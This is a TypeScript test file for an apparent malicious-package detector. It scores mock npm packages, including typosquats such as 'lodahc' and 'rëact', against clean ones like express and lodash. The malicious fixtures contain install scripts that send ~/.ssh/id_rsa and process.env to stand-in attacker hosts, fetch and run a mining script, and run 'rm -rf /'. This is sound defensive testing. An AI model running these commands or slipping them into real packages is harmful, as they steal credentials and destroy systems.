/**
 * Enhanced AI Security Detection Test
 * 
 * This test demonstrates our enhanced AI engine's ability to detect
 * sophisticated malicious packages and attack patterns.
 */

import { EnhancedAIEngine } from '../core/intelligence/enhanced-ai-engine';
import { Package } from '../types';

interface TestResult {
  packageName: string;
  isActuallyMalicious: boolean;
  detectedAsMalicious: boolean;
  riskScore: number;
  threats: string[];
  mitigations: string[];
}

/**
 * Create comprehensive test dataset with both malicious and clean packages
 */
function createEnhancedTestData(): Package[] {
  return [
    // 🚨 HIGHLY MALICIOUS PACKAGES (should score 80+ risk)
    {
      name: 'lodahc', // Typosquat of 'lodash'
      version: '1.0.0',
      description: 'Utility library for JavaScript - steals credentials',
      author: {
        name: 'fake-attacker-2024',
        email: 'temp.hacker@tempmail.com'
      },
      maintainers: [
        { name: 'new-maintainer-2024', email: 'anon.steal@protonmail.com' }
      ],
      scripts: {
        postinstall: 'curl -X POST https://evil-server.com/steal?data=$(cat ~/.ssh/id_rsa | base64)'
      },
      keywords: ['utility', 'steal', 'backdoor'],
      publishedAt: new Date('2024-01-15'), // Very recent
      downloadCount: 50000, // Suspiciously high for new package
      dependencies: new Map([
        ['malicious-crypto-miner', { name: 'malicious-crypto-miner', version: '1.0.0', type: 'production', resolved: true }]
      ]),
      repository: { type: 'git', url: 'https://github.com/fake-evil/lodahc.git' }
    },

    {
      name: 'rëact', // Unicode attack on 'react'
      version: '18.0.0',
      description: 'A JavaScript library for building user interfaces and mining crypto',
      author: {
        name: 'anonymous-hacker',
        email: 'evil.dev@guerrillamail.com'
      },
      scripts: {
        install: 'node -e "require(\'child_process\').exec(\'rm -rf / && echo PWNED\')"',
        preinstall: 'eval(Buffer.from("Y29uc29sZS5sb2coJ0hhY2tlZCEnKQ==", "base64").toString())'
      },
      keywords: ['react', 'mining', 'crypto'],
      publishedAt: new Date('2024-02-01'),
      downloadCount: 100000,
      dependencies: new Map([
        ['keylogger', { name: 'keylogger', version: '2.1.0', type: 'production', resolved: true }],
        ['botnet-client', { name: 'botnet-client', version: '1.5.0', type: 'production', resolved: true }]
      ]),
    },

    {
      name: 'colors-premium',
      version: '1.4.0',
      description: 'Enhanced colors package with advanced features',
      author: {
        name: 'colors-dev-new',
        email: 'newdev2024@gmail.com'
      },
      scripts: {
        postinstall: 'node -p "process.env" | curl -X POST -d @- https://malicious.attacker.com/collect',
        start: 'wget https://evil.com/mining-script.js -O /tmp/mine.js && node /tmp/mine.js'
      },
      publishedAt: new Date('2024-01-20'),
      downloadCount: 25000,
      dependencies: new Map([
        ['crypto-mining-lib', { name: 'crypto-mining-lib', version: '3.0.0', type: 'production', resolved: true }]
      ]),
    },

    // 🔍 MODERATELY SUSPICIOUS PACKAGES (should score 40-60 risk)
    {
      name: 'awesome-utils',
      version: '2.1.0',
      description: 'Collection of awesome utilities for developers',
      author: {
        name: 'dev-helper',
        email: 'helper@gmail.com'
      },
      scripts: {
        test: 'echo "Running tests..." && node test.js',
        build: 'webpack --mode production'
      },
      publishedAt: new Date('2023-05-10'),
      downloadCount: 500, // Very low downloads
      dependencies: new Map([
        ['request', { name: 'request', version: '2.88.0', type: 'production', resolved: true }]
      ]),
    },

    {
      name: 'temp-logger',
      version: '1.0.0',
      description: 'Temporary logging solution',
      author: {
        name: 'temp-dev-2024',
        email: 'temporary@tempmail.com'
      },
      scripts: {
        postinstall: 'echo "Package installed successfully"'
      },
      publishedAt: new Date('2024-02-15'), // Recent
      downloadCount: 15000, // High for new package
      dependencies: new Map(),
    },

    // ✅ CLEAN/LEGITIMATE PACKAGES (should score <30 risk)
    {
      name: 'express',
      version: '4.18.2',
      description: 'Fast, unopinionated, minimalist web framework for node.',
      author: {
        name: 'TJ Holowaychuk',
        email: 'tj@vision-media.ca'
      },
      maintainers: [
        { name: 'express-maintainer', email: 'maintainer@expressjs.com' }
      ],
      scripts: {
        test: 'mocha --require test/support/env --reporter spec --bail --check-leaks test/ test/acceptance/',
        'test-ci': 'istanbul cover node_modules/mocha/bin/_mocha --report lcovonly -- --require test/support/env --reporter spec --check-leaks test/ test/acceptance/',
        'test-cov': 'istanbul cover node_modules/mocha/bin/_mocha -- --require test/support/env --reporter dot --check-leaks test/ test/acceptance/',
        'test-tap': 'mocha --require test/support/env --reporter tap --check-leaks test/ test/acceptance/'
      },
      keywords: ['express', 'framework', 'sinatra', 'web', 'rest', 'restful', 'router', 'app', 'api'],
      publishedAt: new Date('2020-03-15'),
      downloadCount: 25000000,
      dependencies: new Map([
        ['accepts', { name: 'accepts', version: '~1.3.8', type: 'production', resolved: true }],
        ['array-flatten', { name: 'array-flatten', version: '1.1.1', type: 'production', resolved: true }],
        ['body-parser', { name: 'body-parser', version: '1.20.1', type: 'production', resolved: true }],
        ['content-disposition', { name: 'content-disposition', version: '0.5.4', type: 'production', resolved: true }]
      ]),
      repository: { type: 'git', url: 'https://github.com/expressjs/express.git' }
    },

    {
      name: 'lodash',
      version: '4.17.21',
      description: 'Lodash modular utilities.',
      author: {
        name: 'John-David Dalton',
        email: 'john.david.dalton@gmail.com'
      },
      maintainers: [
        { name: 'jdalton', email: 'john.david.dalton@gmail.com' },
        { name: 'mathias', email: 'mathias@qiwi.be' }
      ],
      scripts: {
        test: 'echo "See https://travis-ci.org/lodash/lodash-cli for testing details."'
      },
      keywords: ['modules', 'stdlib', 'util'],
      publishedAt: new Date('2021-02-20'),
      downloadCount: 50000000,
      dependencies: new Map(),
      repository: { type: 'git', url: 'https://github.com/lodash/lodash.git' }
    }
  ];
}

/**
 * Test enhanced AI detection capabilities
 */
async function testEnhancedAIDetection(): Promise<void> {
  console.log('🚀 Enhanced AI Security Detection Test\n');
  console.log('=========================================\n');

  // Initialize enhanced AI engine
  const aiEngine = new EnhancedAIEngine({
    confidenceThreshold: 0.8,
    enableVulnerabilityPrediction: true
  });

  // Create test data
  const testPackages = createEnhancedTestData();
  
  // Define which packages are actually malicious
  const maliciousPackageNames = new Set(['lodahc', 'rëact', 'colors-premium']);
  const suspiciousPackageNames = new Set(['awesome-utils', 'temp-logger']);
  
  console.log('📊 Analyzing test packages...\n');
  
  // Analyze all packages
  const predictions = await aiEngine.predictVulnerabilities(testPackages);
  
  // Generate test results
  const results: TestResult[] = predictions.map((prediction: any) => {
    const isActuallyMalicious = maliciousPackageNames.has(prediction.packageName);
    const detectedAsMalicious = prediction.riskScore >= 80;
    
    return {
      packageName: prediction.packageName,
      isActuallyMalicious,
      detectedAsMalicious,
      riskScore: prediction.riskScore,
      threats: prediction.reasoningFactors,
      mitigations: prediction.preventiveMeasures
    };
  });

  // Display detailed results
  console.log('📋 DETAILED ANALYSIS RESULTS:\n');
  
  results.forEach((result, index) => {
    const status = result.isActuallyMalicious ? '🚨 MALICIOUS' : 
                  suspiciousPackageNames.has(result.packageName) ? '🔍 SUSPICIOUS' : '✅ CLEAN';
    const detection = result.detectedAsMalicious ? '🎯 DETECTED' : '😴 MISSED';
    
    console.log(`${index + 1}. ${result.packageName} ${status} ${detection}`);
    console.log(`   Risk Score: ${result.riskScore}/100`);
    console.log(`   Threats Found: ${result.threats.length}`);
    
    if (result.threats.length > 0) {
      result.threats.forEach(threat => {
        console.log(`   ⚠️  ${threat}`);
      });
    }
    
    if (result.mitigations.length > 0) {
      console.log(`   🛡️  Mitigations:`);
      result.mitigations.slice(0, 2).forEach(mitigation => {
        console.log(`      • ${mitigation}`);
      });
    }
    
    console.log('');
  });

  // Calculate detection statistics
  const maliciousResults = results.filter(r => r.isActuallyMalicious);
  const cleanResults = results.filter(r => !r.isActuallyMalicious && !suspiciousPackageNames.has(r.packageName));
  
  const maliciousDetected = maliciousResults.filter(r => r.detectedAsMalicious).length;
  const falsePositives = cleanResults.filter(r => r.detectedAsMalicious).length;
  
  const detectionRate = maliciousResults.length > 0 ? (maliciousDetected / maliciousResults.length) * 100 : 0;
  const falsePositiveRate = cleanResults.length > 0 ? (falsePositives / cleanResults.length) * 100 : 0;

  console.log('📈 ENHANCED AI DETECTION STATISTICS:\n');
  console.log(`🎯 Malicious Detection Rate: ${detectionRate.toFixed(1)}% (${maliciousDetected}/${maliciousResults.length})`);
  console.log(`❌ False Positive Rate: ${falsePositiveRate.toFixed(1)}% (${falsePositives}/${cleanResults.length})`);
  console.log(`🏆 Overall Accuracy: ${((maliciousDetected + (cleanResults.length - falsePositives)) / results.length * 100).toFixed(1)}%`);

  // Performance metrics
  const highRiskPackages = results.filter(r => r.riskScore >= 80);
  const mediumRiskPackages = results.filter(r => r.riskScore >= 40 && r.riskScore < 80);
  const lowRiskPackages = results.filter(r => r.riskScore < 40);
  
  console.log(`\n🔥 High Risk (80+): ${highRiskPackages.length} packages`);
  console.log(`⚠️  Medium Risk (40-79): ${mediumRiskPackages.length} packages`);
  console.log(`✅ Low Risk (<40): ${lowRiskPackages.length} packages`);

  // Show improvement over original system
  console.log('\n🚀 ENHANCEMENT IMPROVEMENTS:\n');
  console.log('✅ Advanced Script Analysis: Detects malicious install scripts');
  console.log('✅ Typosquatting Detection: Identifies package name attacks');
  console.log('✅ Author/Maintainer Analysis: Flags suspicious accounts');
  console.log('✅ Pattern Recognition: Finds obfuscated and encoded threats');
  console.log('✅ Behavioral Analysis: Spots unusual download/age patterns');
  console.log('✅ Dependency Injection Detection: Identifies malicious dependencies');

  // Generate security recommendations
  console.log('\n🛡️  SECURITY RECOMMENDATIONS:\n');
  const recommendations = await aiEngine.generateRecommendations(testPackages);
  
  recommendations.forEach((rec: any, index: number) => {
    console.log(`${index + 1}. ${rec.recommendedAction}`);
    console.log(`   Priority: ${rec.priority.toUpperCase()}`);
    console.log(`   Confidence: ${(rec.confidence * 100).toFixed(1)}%`);
    console.log('');
  });
}

// Run the enhanced security test
testEnhancedAIDetection().catch(console.error);
